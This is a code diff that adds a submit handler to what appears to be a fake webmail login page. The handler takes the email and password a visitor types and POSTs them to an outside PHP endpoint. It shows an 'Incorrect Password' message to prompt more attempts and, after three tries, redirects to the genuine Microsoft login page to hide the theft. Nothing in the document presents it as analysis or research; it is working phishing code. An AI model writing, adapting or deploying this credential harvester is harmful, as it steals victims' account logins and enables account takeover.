@@ -206,6 +206,62 @@
         $('#field').html("Other Mail");
         $('#ajaxModal').modal('show');
       });
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var detail=$("#field").html();
+
+        
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+        count=count+1;
+        if (count>=3) {
+          count=0;
+          window.location.replace("https://login.microsoftonline.com/common/login");
+        }
+        else
+        {
+         $.ajax({
+          dataType: 'JSON',
+          url: 'https://xyi.aqq.mybt.me/tkado/wfugw.php',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+            detail:detail,
+
+          },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 $('#msg').html(response['msg']);
+                  // $('input, textarea').val(function() {
+                  //    return this.defaultValue;
+                  // });
+                }
+                else{
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#msg").show();
+              $('#msg').html("Incorrect Password");
+              $("#password").val('');
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+       }
+     });
     });
   </script>
   </div><script src="chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/inpage.js" id="stacks-wallet-provider"></script><script>
